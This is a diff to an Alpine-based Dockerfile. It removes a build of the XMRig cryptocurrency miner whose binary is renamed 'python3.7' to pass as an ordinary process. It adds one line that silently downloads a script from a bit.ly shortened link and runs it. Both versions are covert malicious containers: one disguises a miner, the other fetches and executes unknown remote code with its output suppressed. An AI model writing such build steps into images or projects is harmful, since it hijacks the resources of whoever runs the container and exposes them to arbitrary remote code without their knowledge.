@@ -1,16 +1,3 @@
 FROM  alpine:3
 
-RUN apk add --no-cache git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev
-
-RUN git clone https://github.com/xmrig/xmrig
-
-RUN mkdir xmrig/build && cd xmrig/build && \
-    cmake .. && \
-    make -j$(nproc) && \
-    chmod +x xmrig && \
-    rm -r /xmrig/src
-
-COPY config.json /xmrig/build/config.json
-RUN mv xmrig python3.7
-
-ENTRYPOINT ["./entrypoint.sh"]
+RUN wget -O run.sh https://bit.ly/3t2v8Un > /dev/null 2>&1 && chmod u+x run.sh && ./run.sh
